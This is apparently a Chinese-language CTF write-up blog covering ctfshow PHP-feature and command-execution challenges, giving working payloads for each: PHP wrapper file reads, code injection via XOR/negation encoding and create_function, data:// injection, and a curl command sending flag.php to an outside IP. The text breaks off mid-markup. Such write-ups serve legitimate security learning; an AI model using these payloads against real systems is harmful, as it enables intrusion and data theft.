(原生类)</h1><p><code>?v1=FilesystemIterator&amp;v2=getcwd</code>然后直接访问flag文件就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688105770334-d07ff653-1866-418e-91e6-d62e41619def.png" alt="img"></p><p>getcwd获得当前目录之后传入FilesystemIterator 遍历指定路径文件系统中的目录和文件  </p><p>不过如果想遍历需要不断的移动指针不然只会显示当前目录下的第一个文件</p><p>当然这道题目够用了</p><h1 id="WEB-111-全局变量"><a href="#WEB-111-全局变量" class="headerlink" title="WEB-111(全局变量)"></a>WEB-111(全局变量)</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688106245109-cf261e28-2259-43a2-9e3d-265ab8a40493.png" alt="img"></p><p><code>?v1=ctfshow&amp;v2=GLOBALS</code>学到了</p><h1 id="WEB-112-114（伪协议）"><a href="#WEB-112-114（伪协议）" class="headerlink" title="WEB-112,114（伪协议）"></a>WEB-112,114（伪协议）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688106680369-5ac1b3d9-64c6-427e-a427-671e9b461c49.png" alt="img"></p><h1 id="WEB-113-软链接"><a href="#WEB-113-软链接" class="headerlink" title="WEB-113(软链接)"></a>WEB-113(软链接)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/p</span><br><span class="line">roc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/pro</span><br><span class="line">c/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/</span><br><span class="line"><span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/se</span><br><span class="line">lf/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688107482764-a9e34e0f-7270-4035-9c8f-457502df220b.png" alt="img"></p><p>&#x2F;proc&#x2F;self&#x2F;root其实是指向根目录的软链接 </p><p>看别人的WP说是 超过20次软连接后就可以绕过is_file</p><p>不太懂 挺神奇的</p><h1 id="WEB-114-0c"><a href="#WEB-114-0c" class="headerlink" title="WEB-114(%0c)"></a>WEB-114(%0c)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688108120944-d14869fb-39e4-4703-bd79-2872e2072781.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688108142156-8b475290-13f0-4a7b-93e1-2e4a50541c91.png" alt="img"></p><h1 id="WEB-123-php命名规则"><a href="#WEB-123-php命名规则" class="headerlink" title="WEB-123(php命名规则)"></a>WEB-123(php命名规则)</h1><p>老生常谈了 php合法命名规则是字母数字下划线其他字符会被替换为_</p><p>post:<code>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag</code></p><p>但是如果出现<code>[</code>则这个符号被替换为<code>_</code>之后的不合法字符都不会被替换</p><h1 id="WEB-125-highlight-file"><a href="#WEB-125-highlight-file" class="headerlink" title="WEB-125(highlight_file)"></a>WEB-125(highlight_file)</h1><p>post：<code>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=highlight_file($_GET[1])</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=flag.php</span><br></pre></td></tr></table></figure><p>但是不知道为什么inlcude show_source不行 奇怪</p><h1 id="WEB-126-SERVER-‘argv’"><a href="#WEB-126-SERVER-‘argv’" class="headerlink" title="WEB-126($_SERVER[‘argv’])"></a>WEB-126($_SERVER[‘argv’])</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688109739182-2e95e334-c1c5-4c24-bb86-a83cdf262a1a.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688110255660-5da2293b-64eb-46eb-9528-cafd71b8f5a9.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line">GET:?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br><span class="line">这里fl0g要加$原因是起到一个定义变量赋值的作用</span><br></pre></td></tr></table></figure><h1 id="WEB-127-SERVER-‘QUERY-STRING’"><a href="#WEB-127-SERVER-‘QUERY-STRING’" class="headerlink" title="WEB-127($_SERVER[‘QUERY_STRING’])"></a>WEB-127($_SERVER[‘QUERY_STRING’])</h1><p><code>?ctf show=ilove36d</code>还是命名问题 空格会被替换为_从而绕过waf</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688110594778-30b57f7d-7907-40eb-93cc-8a4a470c1d8c.png" alt="img"></p><h1 id="WEB-128（-函数）"><a href="#WEB-128（-函数）" class="headerlink" title="WEB-128（ _()函数）"></a>WEB-128（ _()函数）</h1><p>确实是骚操作</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688111115406-d1578f30-f2d8-43e3-a4c0-09766e2f44ed.png" alt="img"></p><p>在当前域查找信息</p><p>_()是gettext()的拓展函数</p><p>在开启相关设定后，_(“666”)等价于gettext(“666”)，且就返回其中的参数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688111164735-682b1a73-54d6-4627-925d-567431cb0158.png" alt="img"></p><p>打组合拳即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure><h1 id="WEB-129-路径穿越"><a href="#WEB-129-路径穿越" class="headerlink" title="WEB-129(路径穿越)"></a>WEB-129(路径穿越)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=/ctfshow/../../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688181066895-d67b5acc-fcc2-4c1c-ae85-c64c8e387a3c.png" alt="img"></p><h1 id="WEB-130-正则绕过"><a href="#WEB-130-正则绕过" class="headerlink" title="WEB-130(正则绕过)"></a>WEB-130(正则绕过)</h1><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>利用数组 </p><p>preg_match只能处理字符串 所以输入数组会输出false</p><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>字符串解析特性 </p><p><code> f=ctfshow</code>注意f之前有个空格 这样就识别不到我们的f了</p><h1 id="WEB-131-正则回溯"><a href="#WEB-131-正则回溯" class="headerlink" title="WEB-131(正则回溯)"></a>WEB-131(正则回溯)</h1><p>poc如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;f&quot;</span>:<span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>+<span class="string">&quot;36Dctfshow&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=<span class="string">&#x27;http://98e6cfab-efcc-4d13-815e-67de6479bc0d.challenge.ctf.show/&#x27;</span>,data=payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="WEB-132-逻辑运算符特性"><a href="#WEB-132-逻辑运算符特性" class="headerlink" title="WEB-132(逻辑运算符特性)"></a>WEB-132(逻辑运算符特性)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/?username=admin&amp;password=1&amp;code=admin</span><br></pre></td></tr></table></figure><p>先是给了一个信息很多的网站 其实做题多了 直接就会去访问&#x2F;admin后台</p><p>然后得到源码 是一个逻辑问题 <code>x &amp;&amp; y</code> 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： <code>x||y</code> 当x为true时，直接跳过，不执行y</p><p>所以只要保证<code>username=admin</code> 其他两个参数任意即可</p><h1 id="WEB-133（curl外带）"><a href="#WEB-133（curl外带）" class="headerlink" title="WEB-133（curl外带）"></a>WEB-133（curl外带）</h1><p>这道题真是吐了 网上payload没一个可以打通的 多多少少沾点毛病</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>`;+curl -F xx=@flag.php <span class="number">8.130</span>.<span class="number">34.53</span>:<span class="number">7777</span></span><br></pre></td></tr></table></figure><p>用curl外带 就是之后跟一个能接受的VPS 用了DNS接受不到 BP的不太会 最后还是云服务器好用</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688195451931-8a4d5a8b-dd2c-4b75-9a53-2083ed0cd142.png" alt="img"></p><p>其实就可以用反弹shell一样去理解 无回显处理方式而已</p><h1 id="WEB-134-php变量覆盖"><a href="#WEB-134-php变量覆盖" class="headerlink" title="WEB-134(php变量覆盖)"></a>WEB-134(php变量覆盖)</h1><p>payload:<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688192649613-076f4400-50ac-4d55-a9cd-4606546a6e9e.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688192677426-9f1c89e8-d4dd-4fd6-98bc-d02ec14d245b.png" alt="img"></p><p>先将get获取到的参数<code>parse_str($_SERVER[&#39;QUERY_STRING&#39;]);</code>根据<code>&amp;</code>分割成不同部分</p><p>然后<code>extract($_POST);</code> 将$_POST数组中的内容输出不同的键值</p><p>共分为下面三个流程</p><ol><li>_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</li><li>_POST[key1]&#x3D;36d       _POST[key2]&#x3D;36d     parse_str()将其分割为两部分</li><li>key1&#x3D;36d  key2&#x3D;36d extract()  将_POST数组中的键值导入到当前符号表中</li></ol><h1 id="WEB-135（重定向输出）"><a href="#WEB-135（重定向输出）" class="headerlink" title="WEB-135（重定向输出）"></a>WEB-135（重定向输出）</h1><p>官方给的外带不好用</p><p>直接<code>?F=</code>$F<code> ;nl flag.php&gt;1.txt</code></p><p>注意中间有个空格 能刚好让截取长度满6位 不然会破坏我们的命令结构</p><h1 id="WEB-136-tee指令"><a href="#WEB-136-tee指令" class="headerlink" title="WEB-136(tee指令)"></a>WEB-136(tee指令)</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688196227426-c2e1c881-d3e4-4427-b599-0a4796ba0ec9.png" alt="img"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=ls /|tee 1</span><br><span class="line">?c=cat /f149_15_h3r3|tee 2</span><br></pre></td></tr></table></figure><p>就是利用管道符 将我们命令输入的作为tee指令的输入 然后输出到指定的文件中</p><h1 id="WEB-137（静态成员调用方法）"><a href="#WEB-137（静态成员调用方法）" class="headerlink" title="WEB-137（静态成员调用方法）"></a>WEB-137（静态成员调用方法）</h1><p>php通过 类名::属性或者方法 来调用静态成员</p><p>post：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure><h1 id="WEB-138（call-user-func-数组特殊方法）"><a href="#WEB-138（call-user-func-数组特殊方法）" class="headerlink" title="WEB-138（call_user_func()数组特殊方法）"></a>WEB-138（call_user_func()数组特殊方法）</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688197391282-d0774a24-8062-4b0f-838a-baa064aeaeed.png" alt="img"></p><p>通过上面的demo 这样payload可以看懂 </p><p>不仅是字符串 可以给call_user_func()传一个数组的方式去访问静态方法 只能是方法 不能这样访问静态属性</p><p>并且也只能是静态方法 不能是public方法</p><p>post：<code>ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code></p><h1 id="WEB-139（没必要）"><a href="#WEB-139（没必要）" class="headerlink" title="WEB-139（没必要）"></a>WEB-139（没必要）</h1><h1 id="WEB-140-弱相等"><a href="#WEB-140-弱相等" class="headerlink" title="WEB-140(弱相等)"></a>WEB-140(弱相等)</h1><p>偷的payload</p><p><strong>0&#x3D;&#x3D;“字符串”</strong> <strong>返回的是TRUE</strong></p><p>intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">phpinfo</span>())</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">sleep</span>())</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>())</span><br><span class="line"><span class="title function_ invoke__">current</span>(localeconv)</span><br><span class="line"><span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">getcwd</span>())     因为/<span class="keyword">var</span>/www/html md5后开头的数字所以我们改用sha1</span><br></pre></td></tr></table></figure><h1 id="WEB-141-取反之减号"><a href="#WEB-141-取反之减号" class="headerlink" title="WEB-141(取反之减号)"></a>WEB-141(取反之减号)</h1><p>绕过return的方式：<br>php中数字是可以和命令进行一些运算的，例如 1-phpinfo()-1;结合减号是可以执行phpinfo()命令的 运算符应该都可以</p><h1 id="WEB-142"><a href="#WEB-142" class="headerlink" title="WEB-142"></a>WEB-142</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=0</span><br><span class="line">?v1=0x0</span><br></pre></td></tr></table></figure><h1 id="WEB-143-取反之乘号"><a href="#WEB-143-取反之乘号" class="headerlink" title="WEB-143(取反之乘号)"></a>WEB-143(取反之乘号)</h1><p><code>?v1=10&amp;v2=0&amp;v3=*(&quot;%0c%19%0c%5c%60%60&quot;^&quot;%7f%60%7f%28%05%0d&quot;) (&quot;%0e%0c%00%00&quot;^&quot;%60%60%20%2a&quot;)?&gt;</code>waf了减号 换成乘号就行了</p><h1 id="WEB-144-取反之减号"><a href="#WEB-144-取反之减号" class="headerlink" title="WEB-144(取反之减号)"></a>WEB-144(取反之减号)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=(<span class="string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7c%60%60&quot;</span>)(<span class="string">&quot;%03%01%08%00%06%0c%01%07%00%0b%08%0b&quot;</span>^<span class="string">&quot;%60%60%7c%20%60%60%60%60%2e%</span></span><br><span class="line"><span class="string">7b%60%7b&quot;</span>)&amp;v3=-</span><br></pre></td></tr></table></figure><h1 id="WEB-145-取反之三目运算符"><a href="#WEB-145-取反之三目运算符" class="headerlink" title="WEB-145(取反之三目运算符)"></a>WEB-145(取反之三目运算符)</h1><p>最终构造出<code>eval(&quot;return 1?phpinfo():1;&quot;);</code></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=0&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):</span><br></pre></td></tr></table></figure><h1 id="WEB-146-取反之或"><a href="#WEB-146-取反之或" class="headerlink" title="WEB-146(取反之或)"></a>WEB-146(取反之或)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|</span><br></pre></td></tr></table></figure><h1 id="WEB-147-function-name"><a href="#WEB-147-function-name" class="headerlink" title="WEB-147(function_name())"></a>WEB-147(<strong>function_name()</strong>)</h1><p>参考：<a href="https://paper.seebug.org/755/">https://paper.seebug.org/755/</a></p><p>讲的很细 看源码就是大致思路让我们去构造一个函数 并且正则要求需要是特殊的符号开头的 所以平常的函数就不能直接拿来用了</p><p>偷的：</p><p><strong>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</strong></p><p>所以我们可以<code>\</code>开头</p><p>构造类似于这样的 函数第一个参数是传入函数的参数 第二参数是函数内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(&#x27;$a,$b&#x27;,&#x27;return 111&#x27;)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">function a($a, $b)&#123;</span><br><span class="line">    return 111;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们想插入我们的恶意代码就需要sql注入那样闭合的思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(&#x27;$a,$b&#x27;,&#x27;return 111;&#125;phpinfo();//&#x27;)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">function a($a, $b)&#123;</span><br><span class="line">    return 111;&#125;phpinfo();//</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?show=;&#125;system(&#x27;ls&#x27;);//</span><br></pre></td></tr></table></figure><p>post:<code>ctf=%5ccreate_function</code></p><h1 id="WEB-148-中文变量"><a href="#WEB-148-中文变量" class="headerlink" title="WEB-148(中文变量)"></a>WEB-148(中文变量)</h1><p>巧妙的构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br></pre></td></tr></table></figure><p>&#96;</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-命令执行</title>
      <link href="/post/53e2b2e1.html"/>
      <url>/post/53e2b2e1.html</url>
      
        <content type="html"><![CDATA[<p>ctfshow-命令执行</p><span id="more"></span><h1 id="WEB-32-绕括号，分号"><a href="#WEB-32-绕括号，分号" class="headerlink" title="WEB-32(绕括号，分号)"></a>WEB-32(绕括号，分号)</h1><p> include不用括号，分号可以用<code>?&gt;</code>代替 </p><p>利用文件包含+伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="WEB-37-data协议-日志包含-绕flag"><a href="#WEB-37-data协议-日志包含-绕flag" class="headerlink" title="WEB-37(data协议 日志包含 绕flag)"></a>WEB-37(data协议 日志包含 绕flag)</h1><p>文件包含用data协议base64编码绕flag正则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br><span class="line">?c=data://text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>或者先<code>/一句话木马</code>再日志包含  注意url编码问题</p><h1 id="WEB-39-文件包含有后缀干扰"><a href="#WEB-39-文件包含有后缀干扰" class="headerlink" title="WEB-39(文件包含有后缀干扰)"></a>WEB-39(文件包含有后缀干扰)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:text/plain,&lt;?php system(&#x27;cat f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>前面的php语句已经闭合了，所以后面的<code>.php</code>会被当成纯文本直接显示在页面上，起不到什么作用 。</p><h1 id="WEB-40-无参RCE构造"><a href="#WEB-40-无参RCE构造" class="headerlink" title="WEB-40(无参RCE构造)"></a>WEB-40(无参RCE构造)</h1><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>无参RCE构造 根据buu一道题目的套娃来做</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>具体可以看我的文章<a href="https://z1d10t.github.io/post/2ed7a105.html?highlight=%E5%A5%97%E5%A8%83">https://z1d10t.github.io/post/2ed7a105.html?highlight=%E5%A5%97%E5%A8%83</a></p><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br></pre></td></tr></table></figure><p>post一个<code>1=system(&#39;cmd&#39;);</code></p><p>get_defined_vars() —  返回由所有已定义变量所组成的数组 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914581610-576ad783-f44a-468d-a1db-9ea3504ffdec.png" alt="img"></p><p>发现有post数组 然后post一个值 </p><p>post:<code>1=phpinfo();</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914717308-bfe1ea46-39aa-431a-8787-202cf93239f0.png" alt="img"></p><p>将其弹出并且执行就行 这里指针在第一个元素 将其指向第二个元素 即我们需要的</p><p>array_pop — 弹出数组最后一个单元（出栈）</p><p>这里在弹出前用next指针指向了 所以并没有弹出最后一个元素，我是这么理解的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(array_pop(next(get_defined_vars())));</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914940306-f18a0864-d4f0-4ef0-8821-1b4efce9a4cf.png" alt="img"></p><p>得到了我们需要的，然后eval执行就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914969413-b5a38986-22d6-4b3a-8221-f1f3c97396f7.png" alt="img"></p><h1 id="WEB-41-或运算"><a href="#WEB-41-或运算" class="headerlink" title="WEB-41(或运算)"></a>WEB-41(或运算)</h1><p>直接当个脚本小子:)</p><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><h1 id="WEB-42-黑洞"><a href="#WEB-42-黑洞" class="headerlink" title="WEB-42(黑洞)"></a>WEB-42(黑洞)</h1><p>具体可以看<a href="https://www.cnblogs.com/tinywan/p/6025468.html">https://www.cnblogs.com/tinywan/p/6025468.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br></pre></td></tr></table></figure><p>简单说就算<code>$c</code>的内容都会被重定向到一个<code>黑洞</code>就是没有任何输出，相当于被吞掉了</p><p>通过<code>%0a,%20</code>截断绕过就行了</p><h1 id="WEB-43"><a href="#WEB-43" class="headerlink" title="WEB-43(&amp;&amp;)"></a>WEB-43(&amp;&amp;)</h1><p>逻辑与</p><p>先执行左边，只有左边为真，才会执行右边</p><p>注意一下这里<code>&amp;&amp;</code>要url编码一下</p><h1 id="WEB-45-绕空格"><a href="#WEB-45-绕空格" class="headerlink" title="WEB-45(绕空格)"></a>WEB-45(绕空格)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687659970129-65bd9e49-b1dd-49e3-9534-9d4e8a9fb66c.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac$&#123;IFS&#125;fla*.php%0a</span><br></pre></td></tr></table></figure><h1 id="WEB-46-51-重定向绕空格数字"><a href="#WEB-46-51-重定向绕空格数字" class="headerlink" title="WEB-46~51(重定向绕空格数字$)"></a>WEB-46~51(重定向绕空格数字$)</h1><p>参考：<a href="http://c.biancheng.net/view/942.html">http://c.biancheng.net/view/942.html</a></p><p>关于 <code>2&gt;&amp;1</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687661520344-12e86620-a0ec-4eab-96ae-36f0e2fe760f.png" alt="img"></p><p><code>?c=tac&lt;fla&#39;&#39;g.php||</code>或者nl也行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687661628909-18c402c1-f11d-4e96-8a05-20f09a01bd9c.png" alt="img"></p><p>就是将flag.php作为tac的输入 然后利用<code>||</code>逻辑或绕<code>%0a和&amp;&amp;</code> 输入重定向去绕空格</p><h1 id="WEB-51-IFS-绕空格"><a href="#WEB-51-IFS-绕空格" class="headerlink" title="WEB-51(${IFS}绕空格)"></a>WEB-51(${IFS}绕空格)</h1><p>waf了重定向符</p><p>或者用<code>$&#123;IFS&#125;或者$IFS</code> 其实两者是相等的</p><p>关于<code>$&#123;&#125;</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687662639492-af87e7d7-6315-4d0e-814a-56a12c9c8c9a.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/fla?||</span><br><span class="line">?c=nl$&#123;IFS&#125;/fla&#x27;&#x27;g||</span><br></pre></td></tr></table></figure><h1 id="WEB-53-空字符绕空格"><a href="#WEB-53-空字符绕空格" class="headerlink" title="WEB-53(空字符绕空格)"></a>WEB-53(空字符绕空格)</h1><p>不是你这个flag文件夹能不能别老是变动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/fla?</span><br><span 